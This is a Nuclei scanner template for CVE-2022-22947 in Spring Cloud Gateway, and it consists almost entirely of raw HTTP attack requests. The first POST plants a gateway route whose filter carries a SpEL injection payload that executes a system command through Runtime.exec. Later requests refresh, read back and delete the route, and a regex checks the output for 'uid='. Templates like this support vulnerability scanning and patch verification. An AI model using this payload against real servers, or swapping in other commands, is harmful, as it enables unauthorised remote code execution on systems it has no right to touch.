id: spring_cloud_gateway_CVE_2022_22947
info:
  author: 51pwn
  name: spring_cloud_gateway_CVE_2022_22947
  reference:
  - https://github.com/hktalent/nuclei-templates
  - https://51pwn.com
  severity: critical
  tags: spring,CVE-2022-22947,RCE,web,gateway,actuator
requests:
- cookie-reuse: true
  extractors:
  - name: xxxx
    part: body
    regex:
    - (uid=[^\n\\]+)
    type: regex
  matchers:
  - regex:
    - (uid=[^\n\\]+)
    type: regex
  pipeline: true
  pipeline-concurrent-connections: 40
  pipeline-requests-per-connection: 25000
  raw:
  - "POST /actuator/gateway/routes/hack_51pwn_com HTTP/1.1\nHost: {{Hostname}}\nAccept:*/*\n\
    Pragma:no-cache\nContent-Type: application/json\nConnection: keep-alive\nUser-Agent:Mozilla/5.0\
    \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71\
    \ Safari/537.36\nContent-Length: 333\n\n{\n  \"id\": \"hacktest\",\n  \"filters\"\
    : [{\n    \"name\": \"AddResponseHeader\",\n    \"args\": {\"name\": \"Result\"\
    ,\"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new\
    \ String[]{\\\"id\\\"}).getInputStream()))}\"}\n    }],\n  \"uri\": \"https://51pwn.com\"\
    ,\n  \"order\": 0\n}\n"
  - 'POST /actuator/gateway/refresh HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Connection: keep-alive

    Pragma:no-cache

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36


    '
  - 'GET /actuator/gateway/routes/hack_51pwn_com HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Connection: keep-alive

    Pragma:no-cache

    Content-Length: 0

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36


    '
  - 'DELETE /actuator/gateway/routes/hack_51pwn_com HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Connection: keep-alive

    Pragma:no-cache

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36


    '
  - 'POST /actuator/gateway/refresh HTTP/1.1

    Host: {{Hostname}}

    Accept:*/*

    Connection: close

    Pragma:no-cache

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36





    '
  req-condition: true
  unsafe: true
